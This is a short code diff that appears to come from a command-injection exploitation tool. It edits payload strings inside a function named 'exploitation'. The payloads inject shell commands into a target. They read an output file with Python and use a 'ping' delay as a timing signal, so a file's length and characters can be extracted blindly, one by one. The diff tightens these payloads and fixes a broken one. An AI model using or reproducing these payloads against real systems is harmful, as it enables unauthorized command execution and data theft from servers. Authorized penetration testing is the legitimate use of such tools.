@@ -370,7 +370,7 @@ def exploitation(url,delay,filename,http_request_method):
 				  "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ seperator + " "
 				  "if [ \"" + str(j) + "\" != ${str1} ]; " +
 				  "then sleep 0 " + seperator +
-				  "else ping -c"+ str(delay+1) +" 127.0.0.1  " + seperator + " "
+				  "else ping -c"+ str(delay+1) +" 127.0.0.1 " + seperator + " "
 				  "fi "
 				  )
 			#-----------------------------------------------------------------------------------------
@@ -543,7 +543,7 @@ def exploitation(url,delay,filename,http_request_method):
 				    "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);sys.exit(0)\")" + seperator +
 				    "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
 				    "then echo 0" + seperator +
-				    "else ping -c2 " + seperator +
+				    "else ping -c"+ str(delay+1) +" 127.0.0.1 " + seperator +
 				    "fi "
 				    )
 			  #-----------------------------------------------------------------------------------------
